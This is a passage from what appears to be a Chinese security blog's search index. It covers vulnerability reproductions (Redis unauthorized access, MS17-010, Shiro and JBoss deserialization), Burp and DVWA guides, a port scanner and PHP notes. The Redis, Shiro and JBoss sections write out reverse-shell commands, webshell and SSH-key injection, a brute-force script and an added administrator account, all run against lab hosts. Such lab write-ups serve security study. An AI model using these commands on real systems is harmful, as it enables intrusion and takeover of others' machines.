Creation\n任意文件创建\nfile-creation\n\n\nArbitrary File Download\n任意文件下载\nfile-download\n\n\nArbitrary File Deletion\n任意文件删除\nfile-deletion\n\n\nBackup File Found\n备份文件发现\nbak-file-found\n\n\nDatabase Found\n数据库发现\ndb-found\n\n\nDirectory Listing\n目录遍历\ndir-listing\n\n\nDirectory Traversal\n目录穿越\ndir-traversal\n\n\nFile Upload\n文件上传\nfile-upload\n\n\nLogin Bypass\n登录绕过\nlogin-bypass\n\n\nWeak Password\n弱密码\nweak-pass\n\n\nRemote Password Change\n远程密码修改\nremote-pass-change\n\n\nCode Disclosure\n代码泄漏\ncode-disclosure\n\n\nPath Disclosure\n路径泄漏\npath-disclosure\n\n\nInformation Disclosure\n信息泄漏\ninfo-disclosure\n\n\nSecurity Mode Bypass\n安全模式绕过\nsec-bypass\n\n\nMalware\n挂马\nmal\n\n\nBlack Link\n暗链\nblack-link\n\n\nBackdoor\n后门\nbackdoor\n\n\nUnauthorized access\n未授权访问\nUnauthorized access\n\n\n","categories":["Python"],"tags":["Pocsuite"]},{"title":"Burpsuite挂梯子抓包","url":"/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/","content":"一、简介准备挂代理访问外网挖洞实战（另一点是准备挂代理挖国内src~）\n然而挂了代理之后，bp就无法使用了。\n二、解决\n1、Project options下，勾选Upstream Proxy Servers的override user option选项，出现3的输入框\n2、点击Add\n \n1：*全部2：127.0.0.13：梯子的端口4：NoneOK\n\n3、配合bp原有的8080监听端口，打开梯子软件，可实现开启bp访问外网。\n注：梯子需要选择全局代理，否则国内网站依旧是真实ip。\n4、效果\n \n","categories":["Web渗透"],"tags":["BurpSuite代理"]},{"title":"Burpsuite绕过Token爆破","url":"/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/","content":"一、简介Token是服务器端生成的、下发给客户端的、用来对客户端身份进行验证的一种令牌；若是Token不匹配，则不会进行身份验证。所以需要对Token进行识别匹配，从而使密码爆破能够顺利进行。\n环境：\nDVWA + Burpsuite Pro\n二、流程1、使用DVWA的高级模式，进入爆破模块，进行抓包，并发送到攻击器。\n2、进行如下配置\nPosition模块\n\n1：攻击模式选择Pitchfork，意为多对多，一一匹配。2、选定密码和token字段设置变量\n\n\n\nPaloads模块 – 1\n\n1：选定第一个变量（密码）2：攻击载荷选择简单列表3：选择从文件导入（这里做演示则随机添加了包含正确密码的若干密码）\n\n注意：1处需要配置第二个变量的密码模式（token），后续会对token配置，回头再回此设置。\nResource Pool模块\n（注：这里是最新版的多线程模块，老版本应在Request Engine处）\n\n多线程设置为1，因为token是服务器端生成的验证令牌，无法多线程爆破（一次只有一个token生效）\n\nOption模块\n选择Grep Extract模块\n\n点击Add，依次填写\n\n1：获取返回包内容2：匹配关键字token3：选定token值，自动生成匹配规则4：OK\n\n\n\nRedirections模块\n\n选定本次抓包的全部内容为重定向的范围（token在body的隐藏部分）\n\n\n\n最后，回到Payloads模块\n\n1：选定第二个变量2：选定payload类型--递归匹配（这里选完后自动加载了刚刚配置token的匹配规则--payload option部分）3：粘贴抓包部分的token值--需要给定初次抓包的匹配值4：配置完成，开始攻击\n\n3、结果\n\n可见token自动匹配，发包成功\n\n\n\n按照长度排序（状态码相同，无法参考）\n\n在返回包的Render部分，可见DVWA爆破成功的界面。\n至此，token绕过爆破攻击结束。\n","categories":["Web渗透"],"tags":["绕过Token爆破"]},{"title":"centos7搭建DVWA","url":"/article/centos7%E6%90%AD%E5%BB%BADVWA/","content":"一、准备Apache+Mysql+PHP+DVWA\n二、环境搭建安装Apache（httpd）yum install httpd httpd-devel httpd-manual httpd-tools\n\n启动apache并设置开机自启\nsystemctl start httpd  \t\t# 开启apachesystemctl enable httpd  \t# 设置开机自启systemctl status httpd  \t# 查看apache状态\n\n安装Mysqlyum install mariadb-server\n\n启动Mysql并设置开机自启\nsystemctl start mariadb \t \t# 开启mariadbsystemctl enable mariadb \t \t# 设置开机自启systemctl status mariadb  \t\t# 查看mariadb状态\n\n配置Mysql数据库\n初始化mysql数据库（全部回车确认）\nmysql_secure_installation\n\n设置mysql密码（非操作系统密码）\n配置\nmysql -uroot -pcreate database dvwa;\t\t\t# 创建数据库grant all privileges on *.* to dvwa@localhost identified by &#x27;dvwa&#x27;;\t\t# 创建用户\n\n安装PHP(php-fpm php-mysqlnd不装，其他均可)\nyum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap\n\n重启apache使php生效（php不是独立软件，依附apache）\nsystemctl restart httpd\n\n配置\nvim /etc/php.ini修改allow_url_include=Off为allow_url_include=On\n\n安装DVWAwget https://github.com/ethicalhack3r/DVWA/archive/master.zip\n\n解压并复制到/var/www/html目录\n配置\ncd /var/www/html/config/cp config.inc.php.dist config.inc.php\t\t# /DVWA/config目录下vim config.inc.php\t\t\t\t# 修改用户密码为数据库用户密码（root:xxx）$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;chown -R apache:apache /var/www/html/vim /etc/php.ini\t\t# 修改apache配置文件（文件上传会用到）allow_url_include = Onsystemctl restart httpd\t\t\t\t\t\t# 重启apache\n\n三、访问环境http:localhost/setup.php\n\n创建数据库\n登录（admin:password）\n","categories":["环境搭建"],"tags":["DVWA"]},{"title":"Redis未授权访问漏洞复现","url":"/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","content":"一、漏洞描述Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。\n二、漏洞特征开放6379端口，可尝试免密登录\n漏洞版本：Redis 2.x，3.x，4.x，5.x\nredis-cli -h x.x.x.x或redis-cli -h x.x.x.x -p 6379\n\n三、漏洞复现环境搭建攻击机：Kali2020.1\n靶机：Ubuntu20 + Redis2.8.17\n1、下载环境\nwget http://download.redis.io/releases/redis-2.8.17.tar.gz\n\n2、解压并进入安装目录\ntar xzf redis-2.8.17.tar.gzmake\n\n报错：\ngcc: Command not found\n\n解决：安装gcc\napt install gcc\n\n清理编译文件，重新编译\nmake distclean  &amp;&amp; make\n\n3、\n拷贝关键文件\ncp redis.conf /etc/cd srccp redis-benchmark redis-cli redis-server /usr/bin/\n\n4、启动\n./redis-server\t\t#src目录\n\n\n漏洞复现无密码登录redis-cli -h 192.168.24.79\t\t#登录\n\n \n登陆成功\n写webshell前提：登陆成功、知道路径（phpinfo或错误暴路径等）、读写权限等\n因为没有搭建网站环境，这里写在用户根目录\nconfig set dir /home/chen/config set dbfilename redis.php\tset webshell &quot;&lt;?php phpinfo();?&gt;&quot;或set x &quot;\\r\\n\\r\\n&lt;?php phpinfo();?&gt;\\r\\n\\r\\n&quot;save\n\n \n靶机成功写入\n \n定时反弹shell需要管理员权限\nnc -lvnp 4444\t\t# 攻击机开启监听# 连接redis，写定时反弹shellredis-cli -h 192.168.24.79config set dir /var/spool/cron/crontabsconfig set dbfilename rootset xxx &quot;\\n\\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.24.82/4444 0&gt;&amp;1\\n\\n&quot;\t\t#每分钟执行一次反弹连接save\n\n \n注意！\n1、Ubuntu系统需要以管理员权限更改/bin下的软链接指向\nln -s -f bash /bin/sh\t\t# 定时任务bash为dash,无交互功能\n\n2、Ubuntu下定时任务乱码则不执行，需手动删除乱码\n3、redis远程连接创建定时任务权限为644，但是定时任务权限需要为600才可执行\nchmod 600 root\n\n解决以上坑点，成功反弹shell\n \n但是这样意义不大，据说centos无以上坑点。\nssh登录1、攻击机生成ssh密钥（空密码）\nssh-keygen -t rsa\t\t# 全部回车cd .ssh/(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; key.txt\t\t# 写入公钥\n\n2、设置redis变量\ncat ./key.txt | redis-cli -h 192.168.24.79 -x set tide\t\t# 将公钥内容设置给redis变量（靶机ip）\n\n3、连接redis并写入\nredis-cli -h 192.168.24.79config set dir /root/.ssh\t\t\t\t\t# 默认公私钥路径config set dbfilename authorized_keys\t\t# 写入authorized_keyssave\n\n4、检查靶机文件是否写入–已写入（同样带有乱码）\n \n5、攻击机进行ssh连接\nssh -o StrictHostKeyChecking=no 192.168.24.79\t\t# 首次连接需要加-o StrictHostKeyChecking=no\n\n \n连接成功\n（注：靶机需要安装ssh服务并关闭防火墙，或者允许22端口通过防火墙）\n附Ubuntu安装ssh\nsudo apt-get install openssh-server\t\t# 安装sshsudo /etc/init.d/ssh start \t\t\t\t# 开启sshufw allow 22/tcp\t\t\t\t\t\t# 允许通过防火墙或sudo ufw disable\t\t\t\t\t\t# 不建议\n\n主从复制redis:4.x - redis:5.0.5版本漏洞，redis开启主从复制，主从数据相同，主redis只写，从redis只读，从而减小服务器压力。在Redis 4.x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so恶意文件，就可以拓展新命令。\n到这里懒癌犯了，不想搭环境了，附上脚本下载链接，直接过，遇到回头再来。\nhttps://github.com/n0b0dyCN/redis-rogue-server\n\n这里还有个内网redis利用姿势–gopher协议，一并懒过去。\n暴力破解感觉这个比较实用，弱口令yyds！\n准备：\n打开redis.conf配置文件，找到requirepass，去掉注释，修改后面的参数，即为密码\n \n密码登录\nredis-cli -h 192.168.24.79 -a password\n\n以上，开始编写Python脚本\n#!/usr/bin/python# -*- coding:utf-8 -*-&quot;&quot;&quot;    描述：redis未授权访问探测 + 密码爆破    author: chen    date: 2021-07-03&quot;&quot;&quot;import socketimport sysimport threadingimport queueimport osdef poc():    global flag    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((ip, port))    # 发送INFO，如果无密码则返回服务器信息，包含版本信息；如果有密码，则返回“-NOAUTH Authentication required”    s.send(&#x27;INFO\\r\\n&#x27;.encode(&#x27;utf-8&#x27;))    result = s.recv(1024).decode(&#x27;utf-8&#x27;)    if &quot;redis_version&quot; in result:        print(&quot;存在redis未授权访问漏洞！&quot;)        flag = True    elif &quot;Authentication&quot; in result:        flag = False    else:        print(&quot;未知错误&quot;)        flag = None    s.close()def burst():    while not q.empty():        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        s.connect((ip, port))        _pass = q.get()        msg = &quot;AUTH &quot; + _pass + &quot;\\r\\n&quot;          # AUTH pass 为redis密码格式        s.send(msg.encode(&#x27;utf-8&#x27;))        result = s.recv(1024).decode(&#x27;utf-8&#x27;)        if &#x27;+OK&#x27; in result:            print(&quot;存在弱口令，密码为%s&quot; % _pass)            exit()if __name__ == &#x27;__main__&#x27;:    if len(sys.argv) != 5:        print(&quot;请按照格式输出：\\n&quot;)        print(&quot;redis.py 10.10.10.10 6379 字典名 线程数 \\n&quot;)    flag = True    q = queue.Queue()    ip = sys.argv[1]    port = int(sys.argv[2])    dic = sys.argv[3]    thread = sys.argv[4]    poc()    if flag:        exit()    else:        path = os.path.dirname(os.path.realpath(__file__))      # 获取当前脚本目录        for i in open(path + &#x27;/&#x27; + dic):            q.put(i.strip())                                    # 清洗字符，去掉头尾的换行和空格        for i in range(int(thread)):            t = threading.Thread(target=burst(), daemon=True)            t.start()    while True:        pass\n\n结果：\n空密码：\n\n设置密码\n\n————————————————————————————————————————————————————————————\n修改脚本，链接：\nPocsuite3重写redis脚本 (zerochen.top)\n四、修复指定ip登录在redis.conf文件找到# bind 127.0.0.1，去掉注释，修改为指定的登录ip\n缺点：多点登陆失效。\n增加密码打开redis.conf配置文件，找到requirepass，去掉注释，修改后面的参数，即为密码\n","categories":["漏洞复现"],"tags":["Redis"]},{"title":"MS17-010漏洞复现","url":"/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","content":"一、简介：MS17-010又称为永恒之蓝，通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞。目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。\n二、探测靶机：win7 x64 sp1 IP：192.168.66.98攻击机：kali 2020.4 IP：192.168.66.138\n1、通过nmap扫描目标机器，发现139、445端口nmap -V -T4 192.168.66.98   #T4设置扫描速度，越高越快（1-5）#-V显示详情\n\n结果：\n \n2、使用msf探测是否存在MS17-010漏洞a、寻找MS17-010模块\nsearch MS17-010\n\n发现2个探测模块和4个利用模块\n\n3、利用auxiliary/scanner/smb/smb_ms17_010探测模块进行漏洞探测use auxiliary/scanner/smb/smb_ms17_010   \t#调用探测模块show options                 \t\t\t\t#显示配置参数set RHOSTS 192.168.66.98          \t\t\t#设置目标IPrun                     \t\t\t\t\t#运行探测程序\n\n探测出存在MS17-010漏洞\n\n三、利用1、使用攻击模块对靶机发起攻击use exploit/windows/smb/ms17_010_eternalblue    #调用攻击模块show options                                    #显示配置参数set RHOSTS 192.168.66.98                        #设置目标IPrun                                             #运行探测程序\n\n攻击成功，进入后渗透攻击阶段\n\n2、靶机信息收集a、查看目标主机详细信息\nsysinfo\n\n \nb、查看当前获取的权限\ngetuid\n\n \nsystem权限，无需提权\n3、开启远程桌面run getgui -e\n\n\n成功开启远程桌面\n4、切换到cmd命令行模式shell\n\n \n5、添加用户net user  \n\n \nnet user hacker hacker.123 /add        #添加用户、密码net localgroup administrators hacker /add  #提权至管理员组net localgroup administrators        #查看管理员组成员\n\n \n提权成功\n6、开启远程桌面连接a、win+r，输入mstsc调出远程桌面，输入账号密码进行远程桌面连接\n \nb、成功连接至靶机\n \n至此，本次利用结束。后文附上meterpreter的其他指令，不做演示。\n","categories":["漏洞复现"],"tags":["MS17-010"]},{"title":"Shiro反序列化漏洞复现","url":"/article/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","content":"1、探测在登录界面回包中，有rememberMe=deleteMe参数，说明使用Shiro反序列化。\n2、利用a、使用shiroExploit工具检测，反弹shell\nbash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\n\nb、使用xray检测，直接发送payload\nxray webscan --url &quot;http://&quot; --html-output 1.html\n\n或指定脚本检测\nxray webscan --url &quot;http://&quot; --plugins shiro --html-output 1.html\n\n将发包贴入burpsuite发包，将Testecho: namzzg修改为Testcmd:ls即可执行对应指令，也可反弹shell，语句同上\n","categories":["漏洞复现"],"tags":["Shiro"]},{"title":"JBoss反序列化漏洞复现","url":"/article/JBoss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","content":"1、确认漏洞及类型在jboss的url后缀添加如下信息，根据回显确定漏洞版本\na、访问/invoker/readonly，返回500则说明存在漏洞-&gt;CVE-2017-12149\nb、访问/jbossmq-httpil/HTTPServerILServlet，返回This is the JBossMQ HTTP-IL则存在漏洞-&gt;CVE-2017-7504\nc、访问/invoker/EJBInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2013-4810\nd、访问/invoker/JMXInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2015-7501\n2、制作payload工具：ysoserial.jar\n靶机：192.168.66.140（Ubuntu_vulhub）\n攻击机：192.168.66.138\n1、写反弹shellbash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1\n\n2、bash64加密，勾选bashjava.lang.Runtime.exec() Payload Workarounds - @Jackson_T (jackson-t.ca)\nbash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\n\n3、使用ysoserial.jar制作payloadjava -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser\n\n注：CommonsCollections有1-10，5及以后有效\n4、攻击机开启端口监听nc -lvp 1111\n\n5、使用curl命令发送payloadcurl http:192.168.66.140:8080+试探目录 --data-binary @poc.ser\n\n注：poc版本&gt;=5\n6、成功反弹shell","categories":["漏洞复现"],"tags":["JBoss"]},{"title":"Python之端口扫描","url":"/article/Python%E4%B9%8B%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/","content":"一、前言借用端口扫描脚本，记录socket模块和threading模块知识点，以供日后查询。\n二、模块梳理socket模块介绍：网络发包请求模块\n使用\nimport socket\t\t\t\t\t\t# 导包s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) \t\t# 创建socket对象s.bind = ((host,port))\t\t\t\t# 绑定端口s.close\t\t\t\t\t\t\t\t# 断开连接s.send(msg.decode(&#x27;utf-8&#x27;))\t\t\t# 发送数据s.recv(1024)\t\t\t\t\t\t# 接受数据s.settimeout()\t\t\t\t\t\t# 设置超时时间，单位秒s.sendall\t\t\t\t\t\t\t# 发送完整TCP数据s.sendto\t\t\t\t\t\t\t# 发送udp数据# 服务端s.listen\t\t\t\t\t\t\t# 设置最大连接数csocket,addr = s.accept()\t\t\t# 建立客户端连接# 客户端s.connect((host,port))\t\t\t\t# 连接服务器\n\nthreading模块介绍：多线程模块\n使用\nimport threading\t\t\t\t\t\t\t# 导包t = threading.Thread(target=要执行的函数)\t\t# 设置要开启线程的函数t.start()\t\t\t\t\t\t\t\t\t# 开启线程# linux可直接Ctrl+c结束脚本，Windows下失效\n\n守护进程\nt = threading.Thread(target=要执行的函数, daemon=True)   # 设置守护进程，父进程结束则结束全部进程t.start()# 主线程空循环，防止结束，同时用来接收中断信号while True:\tpass# 用于Windows下接收Ctrl+c信号，结束脚本程序。\n\n线程锁，防止多个线程同时操作一个资源对象\nlock = threading.Lock() \t# 多线程开始之前定义lock.acquire()\t\t\t\t# 获取锁lock.release()\t\t\t\t# 释放锁\n\n三、代码#!/usr/bin/python# -*- coding: utf-8 -*-&quot;&quot;&quot;    描述：借用端口扫描项目，梳理套接字、多线程（守护进程、线程锁）的简单使用    author：chen    date:2021-6-27&quot;&quot;&quot;import socketimport sysimport queueimport threading# 全局变量，队列，用来依次存储端口号q = queue.Queue()def portScan(q):    while not q.empty():        port = q.get()        # 设置套接字连接        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        # 设置超时重连时间，单位秒，不设置会导致发包速度极慢，默认15秒        c.settimeout(0.5)        # connect.ex()会一直尝试连接，连接成功返回0，失败返回错误信息（key值）        if c.connect_ex((host, port)) == 0:            print(&quot;%s:%d is open&quot; % (host, port))            s = host + &quot;:&quot; + str(port)            # 开启进程锁，多线程写入数据            lock.acquire()            with open(&#x27;./ports.txt&#x27;, &#x27;a&#x27;) as fp:                fp.write(s + &quot;\\n&quot;)                # 释放锁            lock.release()        else:            print(&quot;%s:%d not open&quot; % (host, port))        # 关闭套接字连接        c.close()# 独立执行时的程序入口if __name__ == &quot;__main__&quot;:    #argv用来接收用户输入，按输入次序分别为argv[0-n],argv[0]表示脚本名    if len(sys.argv) &lt; 3:        print(&quot;请以以下格式输入：&quot;)        print(&quot;python portScan.py ip 线程数&quot;)    host = sys.argv[1]    thread_num = int(sys.argv[2])    # 在进程开始前，定义进程锁，不可在进程中定义锁，否则线程自己使用自己的锁，则失去进程锁的意义    lock = threading.Lock()    for port in range(1, 65536):        q.put(port)    for i in range(thread_num):        # 开启守护进程        t = threading.Thread(target=portScan, args=[q], daemon=True)        t.start()    # 设置主进程死循环，方便接收中断信号    # 因为设置了守护进程，所以主进程结束，子进程也会立刻结束    while True:        pass\n\n四、下载https://www.zerochen.top/download/Port/PortScan.py\n","categories":["Python"],"tags":["端口扫描"]},{"title":"PHP基础","url":"/article/PHP%E5%9F%BA%E7%A1%80/","content":"PHP是嵌入式编程语言，嵌入到HTML中，可以是任何位置。\n\n\n\n介绍\n说明\n\n\n\n语法\n短标签（需要开启short_open_tag=on）\n\n\n注释\n# 单行注释 // 单行注释 /**/ 多行注释\n\n\n变量定义\n$a 不能以数字开头\n\n\n换行\necho ““;\n\n\n输入\n$a = fgets(STDIN);\n\n\n输出\necho $a; printf($a); die($a); 执行完退出 exit($a); 执行完退出\n\n\nphp数据类型\n整型 浮点型 字符串 bool型 null型 数组 对象 $a = new PDO(‘mysql://127.0.0.1’);\n\n\n字符串连接\n. 字符串、整型、浮点型等 .= 用于字符串追加\n\n\n单双引号\n“” 解析特殊字符（如变量） ‘’ 不解析特殊字符 或者斜杠转义\n\n\n比较\n== 值比较 === 类型比较\n\n\n逻辑运算符\nand &amp;&amp; 与运算，双true为true or || 或运算，单true则true xor 异或，有且仅有一个true为true ! 非，不为true则true\n\n\n三元运算符\ncondition?value of true:value of false\n\n\n条件判断\nif(){ }elseif(){ }else{ }\n\n\n循环\n\n\n\n函数\n说明\n\n\n\nwhile\nwhile循环\n\n\nfor\nfor循环\n\n\nforeach($a as $i)\n用i在a中遍历\n\n\n数组\n\n\n\n说明\n函数\n\n\n\n索引数组\n$a=array(1,’二’,3,4); $a[1];\n\n\n关联数组\n$a=[ ‘uname’=&gt;’zs’, ‘age’=&gt;18 ]; echo $a[‘age’];\n\n\n混合数组\n$a=[ ‘hello’, ‘age’=&gt;18, 123, ‘pass’=&gt;’123456’, 456 ]; a[1]=123 a[‘age’]=18 注意，指向不占下标顺序\n\n\n数组增删\n\n\n\n说明\n函数\n\n\n\n追加\n$a[‘w’]=’q’ 赋值追加 array_push($a,’a’)\n\n\n删除\narray_pop($a); 删除数组最后一个元素\n\n\n数组排序\n\n\n\n函数\n说明\n\n\n\nsort()\n升序排序\n\n\nrsort()\n降序排序\n\n\nksort()\n根据键升序排序\n\n\nkrsort()\n根据键降序排序\n\n\nasort()\n根据值，升序排序\n\n\narsort()\n根据值，降序排序\n\n\n注：排序操作会改变原来数组\n遍历输出\nfor($i=0;$i&lt;sizeof($a);$i++){\necho $a[$i];\n}\nforeach ($a as $key=&gt;$value)\n函数\n\n\n\n函数\n说明\n\n\n\nvar_dump()\n输出详细信息\n\n\nstrlen()\n判断字符串长度\n\n\ntrim()\n去除两侧空字符串，清理数据\n\n\nintval()\n把字符串转为整型\n\n\ncount()、sizeof()\n返回数组长度\n\n\nempty()\n检查变量是否为空\n\n\ngettype()\n获取变量类型\n\n\nis_array()\n检查变量是否为数组类型\n\n\nisset()\n检查变量是否被设置或赋值\n\n\nunset()\n释放变量\n\n\nsubstr()\n截取字符串,起点-长度\n\n\nstrstr()\n截取字符串，起点-结尾\n\n\nmd5()\n计算字符串MD5值\n\n\ntime()\n获取当前时间（元年计数法，秒）\n\n\ndate(“Y-m-d H:i:s”,time())\n将时间戳转化为日期格式\n\n\nfeof()\n检查文件是否读取至文件末，常用于判断文件是否读取完毕\n\n\nexplode()\n分割字符串 explode(‘::’,$line)\n\n\nstr_ireplace()\n替换字符串，不区分大小写 str_ireplace($search, $replace, $str); 在str中将replace替换为search\n\n\n文件操作\n\n\n\n函数\n说明\n\n\n\nfread()\n读取整个文件或指定长度的字符串，可用于二进制文件读取\n\n\nfgets()\n读取文件中的一行\n\n\nfgetss()\n读取文件中的一行，并去掉所有HTML、PHP标记\n\n\nfgetc()\n读取文件中的一个字节\n\n\nfile()\n将文件读取到数组\n\n\nfile_get_contents()\n无需打开文件及关闭文件，读取文件全部内容到字符串，文件不存在则自动创建\n\n\nfile_put_contents()\n将字符串内容写入文件，文件不存在则自动创建\n\n\ncopy()\n复制文件\n\n\nunlink()\n删除文件\n\n\nrename()\n重命名文件或目录，或移动文件\n\n\nftruncate()\n将文件截断到指定长度\n\n\nfile_exits()\n判断文件或文件夹是否存在\n\n\nfilesize()\n只读，返回文件大小\n\n\nfiletype()\n只读，返回文件类型，如文件或文件夹\n\n\nfilectime()\n返回文件创建时间的时间戳\n\n\nfilemtime()\n只读，返回文件的修改时间\n\n\nrealpath()\n返回文件的物理路径\n\n\npathinfo()\n以数组形式返回文件的路径和文件名信息\n\n\n类和对象\n类：同样特征和行为的对象的集合\n类中变量=&gt;属性\n类中函数=&gt;方法\n对象=&gt;类的实例化\n\n\n\n说明\n函数\n\n\n\n类的声明\nclass Person{ var 属性1; var 属性2; function name1(){ //方法1 } function name2(){ //方法2 } }\n\n\n类的使用\n$a=new Person; 实例化对象 $a-&gt;name=’小马’; 对象属性赋值 $a-&gt;say(); 对象方法调用\n\n\n文件处理\n$a = fopen(‘1.txt’,’a’) 以a方式打开文件\nfclose($a) 关闭文件\n打开文件方式\n\n\n\n参数\n说明\n\n\n\nr\n只读打开，文件不存在则出错\n\n\nw\n写入方式打开，游标指向文件头，文件不存在则创建\n\n\na\n以追加方式打开，游标指向文件末，文件不存在则创建\n\n\nb\n以二进制方式打开文件，可与r、w、a合用\n\n\nr+\n读写方式打开，游标指向文件头\n\n\nw+\n读写方式打开，游标指向文件头，并删除文件内容\n\n\na+\n以追加方式打开，游标指向文件末\n\n\nx\n以只写方式创建并打开，游标指向文件头。文件存在则打开失败\n\n\nx+\n以读写方式创建并打开，游标指向文件头。文件存在则打开失败\n\n\n文件读取、写入\n\n\n\n函数\n说明\n\n\n\nfgets()\n读取一行\n\n\nfile_get_contents()\n读取全部\n\n\nfwrite()\n将一个字符串写入文件 ‘)?&gt;\n\n\n表单处理\n超全局变量，只有在web模式下才可以使用\n\n\n\n函数\n说明\n\n\n\n$_REQUEST\nGET、POST集合，但是速度慢\n\n\n$_GET\n接收GET方式提交的数据，数据量小，url可见 ?传参，多个参数使用&amp;连接 a标签（链接）也可以使用GET方式传参\n\n\n$_POST\n接收POST方式提交的数据，数据量不限 需要表单提交\n\n\n$_FILES\n接收文件提交（暂存至临时目录） 移动临时文件文件至指定目录 $file=$FILES[‘file’]; if($file[‘error’]==0){ move_uploaded_file($file[‘tmp_name’],’uploadfile/‘.$file[‘name’]); } 可用echo $FILES查看FILES属性，包括临时目录位置\n\n\n$_COOKIE\n接收cookie值 setcookie()创建cookie\n\n\n$_SESSION\n接收SESSION值 session_star()开启session session_id()获取session\n\n\n$_SERVER\n获取服务器和执行环境信息\n\n\n$_ENV\n接收服务器端环境变量（数组）\n\n\n在变量前增加@符号，可忽略简单错误\n如：\necho @$_POST[‘name’];\n其他：\nPHP获取表单数据时，根据表单下textarea、input标签的属性来接收数据\n会话控制\n\n\n\n函数\n说明\n\n\n\ncookie\n保存在客户端，包含用户有关信息，有过期时间 cookie有内置数据，可直接使用 setcookie(name,value) 创建cookie setcookie(name,’’,0) 销毁cookie（）设置时间为0\n\n\nsession\n保存在服务器，cookie升级版，无过期时间，但是长时间无请求，则清除session session为空数组，需赋值使用 session_start() 创建session $_SESSION[‘a’]=$b; session赋值 session_destroy() 销毁session（退出登录）\n\n\n定界符，EOF中间所有内容将按原编码存入变量\necho &lt;&lt;&lt;EOF\nxxx\nEOF;\n文件包含\n包含指定文件，实现代码复用\n\n\n\n函数\n说明\n\n\n\ninclude()\n文件包含失败时，会产生警告，脚本会继续运行\n\n\nrequire()\n文件包含失败时，会产生错误，直接结束脚本执行\n\n\ninclude_once()\n与inlude()功能相同，文件只会被包含一次（出现多次时只生效一次）\n\n\nrequire_once()\n与require()功能相同，文件只会被包含一次\n\n\n用法：\ninclude_once ‘header.php’;\ninclude_once($GET[‘action’]);\n若是包含变量，则可能存在文件包含漏洞\nMYSQL数据类型（遵循sql编程规则）\n\n\n\n数据类型\n说明\n\n\n\n数值型\nint：整型 可以是十进制或十六进制 float：浮点型\n\n\n字符串\nCHAR：长字符串 VARCHAR：可变长字符串（常用） BLOB：存储二进制数据 text：长文本信息\n\n\n日期和时间\ntime：时间 date：日期 datetime：日期和时间\n\n\nMYSQL数据库操作\n配置文件\n\n\n\n操作系统\n位置\n\n\n\nLinux\n/etc/my.conf\n\n\nWindows\n安装目录/my.ini\n\n\n常用命令\n\n\n\n函数\n说明\n\n\n\nshow databases;\n显示所有数据库\n\n\nuse dbname;\n选定数默认数据库\n\n\nshow tables;\n显示默认数据库中所有表\n\n\n\n\n\n\ncreate database db_test;\n创建数据库\n\n\nuse db_test;\n选定数据库\n\n\ncreate table tb_test();\n创建表 CREATE TABLE tb_news( id INT(10) UNSIGNED UNIQUE AUTO_INCREMENT, title VARCHAR(100) NOT NULL, author VARCHAR(20) NOT NULL, content TEXT NOT NULL, addtime TIMESTAMP, PRIMARY KEY (id) );  CREATE TABLE tb_users( id INT(10) UNSIGNED AUTO_INCREMENT, uname VARCHAR(20) NOT NULL, upass VARCHAR(50) NOT NULL, activeSrc VARCHAR(100) DEFAULT ‘image/default.jpg’, email VARCHAR(50) NOT NULL, addtime TIMESTAMP, PRIMARY KEY (id) ); 注： UNIQUE 值唯一 id属性固定（设置自增长） KEY属性固定（设定ID为主键）\n\n\ndesc tb_test;\n查看表内容\n\n\n\n\n\n\ninsert INTO tb_test (字段) VALUE (‘内容’);\n新增字段，键值一一对应 insert INTO tb_test (author,title,content) VALUES 